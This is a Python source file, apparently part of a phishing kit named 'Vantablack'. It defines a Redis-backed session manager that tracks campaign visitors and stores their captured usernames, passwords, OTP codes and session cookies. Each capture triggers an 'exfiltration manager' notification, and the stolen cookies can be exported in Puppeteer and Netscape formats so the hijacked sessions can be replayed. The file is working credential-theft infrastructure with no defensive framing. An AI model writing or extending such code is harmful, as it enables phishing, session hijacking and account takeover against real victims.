import uuid
import json
import time
import asyncio
from typing import Dict, Any, Optional, List
from core.cache.redis_manager import redis_cache
from core.exfiltration.manager import exfiltration_manager

class SessionManager:
    """
    Gestionnaire de Session Vantablack (Redis-backed)
    Stocke l'état des sessions utilisateurs, les identifiants capturés, et les cookies.
    """
    
    SESSION_TTL = 3600  # 1 heure
    
    def create_session(self, campaign_id: str, client_ip: str, user_agent: str) -> str:
        """
        Crée une nouvelle session pour un visiteur.
        """
        session_id = str(uuid.uuid4())
        session_data = {
            "session_id": session_id,
            "campaign_id": campaign_id,
            "client_ip": client_ip,
            "user_agent": user_agent,
            "created_at": time.time(),
            "status": "active",
            "captured_data": {},
            "cookies": [],
            "raw_cookies": []
        }
        
        self._save_session(session_id, session_data)
        return session_id

    def get_session(self, session_id: str) -> Optional[Dict[str, Any]]:
        """
        Récupère les données d'une session.
        """
        data = redis_cache.get(f"session:{session_id}")
        if data:
            return data # redis_manager gère déjà le JSON parsing si implémenté, sinon check
        return None

    def update_session(self, session_id: str, updates: Dict[str, Any]):
        """
        Met à jour les données d'une session (merge).
        """
        current_data = self.get_session(session_id)
        if current_data:
            current_data.update(updates)
            self._save_session(session_id, current_data)

    def capture_credential(self, session_id: str, key: str, value: str):
        """
        Enregistre un identifiant capturé (username, password, OTP).
        """
        session = self.get_session(session_id)
        if session:
            session["captured_data"][key] = value
            self._save_session(session_id, session)
            
            # Exfiltration Notification
            try:
                loop = asyncio.get_running_loop()
                loop.create_task(exfiltration_manager.notify_capture(session_id, session, "credentials"))
            except RuntimeError:
                pass

    def capture_cookies(self, session_id: str, cookies: List[Dict[str, Any]]):
        """
        Enregistre les cookies de session avec leurs attributs complets.
        cookies: Liste de dicts {'name', 'value', 'domain', 'path', ...}
        """
        session = self.get_session(session_id)
        if session:
            if "cookies" not in session:
                session["cookies"] = []
            
            # Merge logic: Update existing cookies by name/domain/path or append new ones
            # Pour simplifier, on append et on dédoublonnera à l'export ou on remplace par nom
            # Mieux: Utiliser un dict indexé par "name:domain:path"
            
            current_cookies_map = {
                f"{c.get('name')}:{c.get('domain', '')}:{c.get('path', '/')}": c 
                for c in session["cookies"]
            }
            
            for cookie in cookies:
                key = f"{cookie.get('name')}:{cookie.get('domain', '')}:{cookie.get('path', '/')}"
                current_cookies_map[key] = cookie
                
            session["cookies"] = list(current_cookies_map.values())
            self._save_session(session_id, session)
            
            # Exfiltration Notification
            try:
                loop = asyncio.get_running_loop()
                loop.create_task(exfiltration_manager.notify_capture(session_id, session, "cookies"))
            except RuntimeError:
                pass

    def log_raw_cookie(self, session_id: str, cookie_str: str):
        """
        Log un cookie brut (Set-Cookie header) pour debug ou analyse manuelle.
        """
        session = self.get_session(session_id)
        if session:
            if "raw_cookies" not in session:
                session["raw_cookies"] = []
            
            if cookie_str not in session["raw_cookies"]:
                session["raw_cookies"].append(cookie_str)
                self._save_session(session_id, session)

    def export_session(self, session_id: str, format: str = "json") -> Any:
        """
        Exporte les cookies de session dans un format utilisable.
        Formats: 'json' (raw list), 'puppeteer' (liste d'objets stricte), 'netscape' (string).
        """
        session = self.get_session(session_id)
        if not session or "cookies" not in session:
            return [] if format in ["json", "puppeteer"] else ""

        cookies = session["cookies"]
        
        if format == "json":
            return cookies
            
        elif format == "puppeteer":
            # Puppeteer attend: name, value, domain, path, expires, httpOnly, secure, sameSite
            return cookies
            
        elif format == "netscape":
            # Format Netscape HTTP Cookie File
            lines = ["# Netscape HTTP Cookie File"]
            for c in cookies:
                domain = c.get("domain", ".example.com")
                flag = "TRUE" if domain.startswith(".") else "FALSE"
                path = c.get("path", "/")
                secure = "TRUE" if c.get("secure", False) else "FALSE"
                expiration = c.get("expires", 0) # Timestamp
                name = c.get("name", "")
                value = c.get("value", "")
                
                lines.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}")
            return "\n".join(lines)
            
        return cookies

    def _save_session(self, session_id: str, data: Dict[str, Any]):
        """
        Sauvegarde interne dans Redis.
        """
        redis_cache.set(f"session:{session_id}", data, expire=self.SESSION_TTL)

# Instance globale
session_manager = SessionManager()
